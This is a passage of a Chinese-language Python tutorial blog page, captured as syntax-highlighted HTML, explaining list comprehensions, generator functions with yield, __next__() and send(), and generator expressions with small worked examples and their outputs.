class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>运行结果：<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">for</span>前面是一个表达式，表示将<span class="token keyword">in</span>后面的元素按照这个表达式进行计算出来后还要看<span class="token keyword">in</span>后面有没有筛选条件，然后赋值给<span class="token keyword">for</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">in</span>中间的变量。格式如下：表达式<span class="token number">1</span> <span class="token keyword">for</span> 变量 <span class="token keyword">in</span> 可迭代对象 <span class="token punctuation">[</span>表达式<span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">.</span> <span class="token keyword">for</span>循环后面还可以加上<span class="token keyword">if</span>判断，这样我们就可以筛选出仅偶数的平方：a <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token operator">*</span> x <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>运行结果：<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">.</span> 还可以使用两层循环，可以生成全排列：b <span class="token operator">=</span> <span class="token punctuation">[</span>m <span class="token operator">+</span> n <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token string">'ABC'</span> <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token string">'XYZ'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>运行结果：<span class="token punctuation">[</span><span class="token string">'AX'</span><span class="token punctuation">,</span> <span class="token string">'AY'</span><span class="token punctuation">,</span> <span class="token string">'AZ'</span><span class="token punctuation">,</span> <span class="token string">'BX'</span><span class="token punctuation">,</span> <span class="token string">'BY'</span><span class="token punctuation">,</span> <span class="token string">'BZ'</span><span class="token punctuation">,</span> <span class="token string">'CX'</span><span class="token punctuation">,</span> <span class="token string">'CY'</span><span class="token punctuation">,</span> <span class="token string">'CZ'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">.</span> <span class="token keyword">for</span>循环其实可以同时使用两个甚至多个变量，比如dict的items<span class="token punctuation">(</span><span class="token punctuation">)</span>可以同时迭代key和value：d <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'x'</span><span class="token punctuation">:</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">:</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">:</span> <span class="token string">'C'</span> <span class="token punctuation">}</span>a <span class="token operator">=</span> <span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token string">'='</span> <span class="token operator">+</span> v <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> d<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>运行结果：<span class="token punctuation">[</span><span class="token string">'x=A'</span><span class="token punctuation">,</span> <span class="token string">'y=B'</span><span class="token punctuation">,</span> <span class="token string">'z=C'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h3 id="二-生成器"><font color="#FF6347" face="Comic sans MS">二. 生成器</font><a href="post/Python-generator-iterator#二-生成器"></a></h3><p>参考资料：<br><font face="Comic sans MS"><font color="#00B2EE">《<a href="https://www.cnblogs.com/wj-1314/p/8490822.html#undefined" target="_blank" rel="noopener">python 生成器和迭代器有这篇就够了</a>》</font><br></font><font face="Comic sans MS"><font color="#00B2EE">《<a href="http://www.runoob.com/python3/python3-iterator-generator.html" target="_blank" rel="noopener">Python3 迭代器与生成器</a>》</font><br></font><font face="Comic sans MS"><font color="#00B2EE">《<a href="http://www.runoob.com/w3cnote/python-yield-used-analysis.html" target="_blank" rel="noopener">Python yield 使用浅析</a>》</font><br></font></p><br><p><font color="#00B2EE"><strong>什么是生成器？</strong></font></p><p>　　通过列表生成式，我们可以直接创建一个列表，但是，受到内存限制，列表容量肯定是有限的，而且创建一个包含100万个元素的列表，不仅占用很大的存储空间，如果我们仅仅需要访问前面几个元素，那后面绝大多数元素占用的空间都白白浪费了。</p><p>　　所以，如果列表元素可以按照某种算法推算出来，那我们是否可以在循环的过程中不断推算出后续的元素呢？这样就不必创建完整的list，从而节省大量的空间，在Python中，这种一边循环一边计算的机制，称为<strong>生成器：generator</strong></p><p>　　生成器是一个特殊的程序，可以被用作控制循环的迭代行为，python中生成器是迭代器的一种，使用yield返回值函数，每次调用yield会暂停，而可以使用next()函数和send()函数恢复生成器。</p><p>　　生成器类似于返回值为数组的一个函数，这个函数可以接受参数，可以被调用，但是，不同于一般的函数会一次性返回包括了所有数值的数组，生成器一次只能产生一个值，这样消耗的内存数量将大大减小，而且允许调用函数可以很快的处理前几个返回值，因此生成器看起来像是一个函数，但是表现得却像是迭代器</p><br><blockquote><p><font color="#FF7F00"><strong>python提供了两种生成器基本的方式</strong></font><br><font color="#FF7F00"><strong>生成器函数：</strong></font>也是用def定义的，利用关键字yield一次返回一个结果、阻塞，重新开始<br><font color="#FF7F00"><strong>生成器表达式：</strong></font>返回一个对象，这个对象只有在需要的时候才产生结果</p></blockquote><br><br><h4 id="2-1-yield、-next-、send"><font color="#3CB371" face="Comic sans MS">2.1 yield、__next__()、send()</font><a href="post/Python-generator-iterator#2-1-yield、-next-、send"></a></h4><br><ol><li><p>带有yield语句的函数不再是一个普通的函数，而是一个生成器generator，可用于迭代。</p></li><li><p>yield是一个类似return 的关键字，<font color="#FF7F00"><strong>返回一个值或者表达式</strong></font>，迭代一次遇到yield的时候就返回yield后面（代码块）或者右面（单行）的值，然后暂停。</p></li><li><p>一个函数正常执行遇到yeild时，<font color="#FF7F00"><strong>yeild返回一个值给函数的调用者，然后在这暂停并记住这个位置</strong></font>（因为此时程序要跳转到调用这个函数的地方 =&gt; 因为yeild的返回）<font color="#FF7F00"><strong>！不去执行下一个语句的代码。当程序执行遇到__next__()方法或者next()（Python2用）时，继续执行上次yield的下一个语句直到遇到下一个yield或者该函数结束。</strong></font></p></li><li><p>send()和next()的区别就在于send可传递参数给yield表达式，这时候传递的参数就会作为yield表达式的值，而yield的参数是返回给调用者的值，也就是说send可以强行修改上一个yield表达式值。</p></li><li><p>send()和next()都有返回值，他们的返回值是当前迭代遇到的yield的时候，yield后面表达式的值，其实就是当前迭代yield后面的参数。</p></li><li><p><font color="#FF7F00"><strong>for…in 循环中会自动调用 next()</strong></font>。这就说明for…in能够不中断地执行完整个函数。</p></li></ol><br><p>下面举例子说明：</p><pre class="line-numbers language-python"><code class="language-python">下面的例子用 a<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span> 和 <span class="token keyword">print</span><span class="token punctuation">(</span>next<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span> 来说明yeild的返回和暂停<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>例<span class="token number">1</span>：<span class="token keyword">def</span> <span class="token function">odd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'step 1'</span><span class="token punctuation">)</span>    <span class="token keyword">yield</span> <span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'step 2'</span><span class="token punctuation">)</span>    <span class="token keyword">yield</span> <span class="token number">3</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'step 3'</span><span class="token punctuation">)</span>    <span class="token keyword">yield</span> <span class="token number">5</span>a <span class="token operator">=</span> odd<span class="token punctuation">(</span><span class="token punctuation">)</span>b <span class="token operator">=</span> a<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'*****分割线*****'</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>c <span class="token operator">=</span> a<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'*****分割线*****'</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> 输出：       step <span class="token number">1</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">*</span>分割线<span class="token operator">**</span><span class="token operator">**</span><span class="token operator">*</span><span class="token number">1</span>step <span class="token number">2</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">*</span>分割线<span class="token operator">**</span><span class="token operator">**</span><span class="token operator">*</span><span class="token number">3</span>结论：这个时候在<span class="token keyword">yield</span> <span class="token number">1</span>处暂停了（输出step1），并且<span class="token keyword">yield</span>返回了一个值<span class="token number">1</span>给a<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span> 。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h4 id="2-2-表达式创建生成器"><font color="#3CB371" face="Comic sans MS">2.2 表达式创建生成器</font><a href="post/Python-generator-iterator#2-2-表达式创建生成器"></a></h4><blockquote><p><font color="#FF7F00"><strong>generator保存的是算法，每次调用next(generaotr_ex)就计算出他的下一个元素的值，直到计算出最后一个元素，没有更多的元素时，抛出StopIteration的错误。</strong></font></p></blockquote><p>要创建一个generator，有很多种方法，第一种方法很简单，只有<font color="#FF7F00"><strong>把一个列表生成式的[]中括号改为（）小括号</strong></font>，就创建一个generator:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#列表生成式</span>lis <span class="token operator">=</span> <span class="token punctuation">[</span>x<span class="token operator">*</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>lis<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#生成器</span>generator_ex <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">*</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>generator_ex<span class="token punctuation">)</span>结果：<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>generator object <span class="token operator">&lt;</span>genexpr<span class="token operator">></span> at <span class="token number">0x000002A4CBF9EBA0</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>　　那么创建lis和generator_ex，的区别是什么呢？从表面看就是[  ]和（）,但是结果却不一样，一个打印出来是列表（因为是列表生成式），而第二个打印出来却是&lt;generator object <genexpr> at 0x000002A4CBF9EBA0&gt;，那么如何打印出来generator_ex的每一个元素呢？</genexpr></p><p>　　如果要一个个打印出来，可以通过 <code>__next__()</code> 获得generator的下一个返回值：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#生成器</span>generator_ex <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">*</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>generator_ex<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>generator_ex<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token 